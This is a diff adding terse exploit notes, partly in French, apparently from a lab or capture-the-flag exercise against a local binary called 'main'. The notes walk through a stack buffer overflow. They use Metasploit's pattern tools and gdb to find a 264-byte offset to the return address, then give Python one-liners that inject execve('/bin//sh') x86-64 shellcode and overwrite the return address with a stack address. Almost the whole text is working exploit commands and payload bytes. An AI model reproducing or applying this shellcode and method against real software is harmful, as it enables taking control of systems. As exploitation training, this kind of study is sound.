@@ -1,0 +1,30 @@
+erase with many A
+Cannot access memory at address 0x414141414141
+
+root@kali-vm:/usr/share/metasploit-framework/tools/exploit#
+$./pattern_create.rb  -l 270
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9
+
+$gdb main
+(gdb)run Aa0Aa1....Ai5Ai6Ai7Ai8Ai9
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+Cannot access memory at address 0x396941386941
+
+On convertit l'addresse en ASCII et on l'inverse pour compenser l'endianness.
+$echo 396941386941 | xxd -r -p | rev
+Ai8Ai9%
+$./pattern_offset.rb  -l 264 -q Ai8A
+[*] Exact match at offset 264
+
+Stack injection address : 0x7fff_ffff_d660
+0x7fffffffd660:
+
+python -c 'print "A"*264+"\x60\xd6\xff\xff\xff\x7f\x00\x00"')
+branching ok
+SHELLCODE SIMPLE :
+\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53" "\x54\x5f\x52\x57\x54\x5e\x0f\x05
+
+python -c 'print "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" + "A"*(264-24) +"\x60\xd6\xff\xff\xff\x7f\x00\x00"')
+
